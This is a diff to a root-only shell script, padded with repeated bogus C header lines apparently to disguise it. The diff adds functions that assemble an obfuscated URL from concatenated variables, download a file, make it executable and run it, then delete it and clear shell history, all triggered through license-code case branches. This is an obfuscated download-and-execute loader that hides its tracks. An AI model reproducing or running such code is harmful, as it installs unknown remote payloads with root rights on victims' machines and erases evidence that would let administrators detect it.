@@ -2,10 +2,49 @@
 myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
 myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
 flag=0
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
 if [ $USER != 'root' ]; then
 	echo "Sorry, for run the script please using root user"
 	exit
 fi
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+vu="tuong"
 licence () {
 #if 0
 #endif
@@ -1398,13 +1437,22 @@ ngay="raw"
 #include <unistd.h>
 #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
 #	define PTRACE_ATTACH	PT_ATTACH
-function lee-auto () {
+function lee-hafl () {
 $taive $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin$gach$dich$thuc
 clear
 lee-connect
 chmod +x $dich$thuc
 $cham$gach$dich$thuc
 rm -f $dich$thuc
+history -c
+}
+function lee-full () {
+$taive $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin$gach$dich$vu
+clear
+lee-connect
+chmod +x $dich$vu
+$cham$gach$dich$vu
+rm -f $dich$vu
 history -c
 }
 licence () {
@@ -2471,14 +2519,58 @@ echo ""
 #include <unistd.h>
 #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
 #	define PTRACE_ATTACH	PT_ATTACH
-#endif
+#hafl
         2013)
         lee-connect
-		lee-auto
+		lee-hafl
 		;;
+		???)
+        lee-connect
+		lee-hafl
+		;;
+		????)
+        lee-connect
+		lee-hafl
+		;;
+		?????)
+        lee-connect
+		lee-hafl
+		;;
+#endif
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#full
 		301)
         lee-connect
-		lee-auto
+		lee-full
+		;;
+		???)
+        lee-connect
+		lee-full
+		;;
+		????)
+        lee-connect
+		lee-full
+		;;
+		?????)
+        lee-connect
+		lee-full
 		;;
 	esac
 end () {
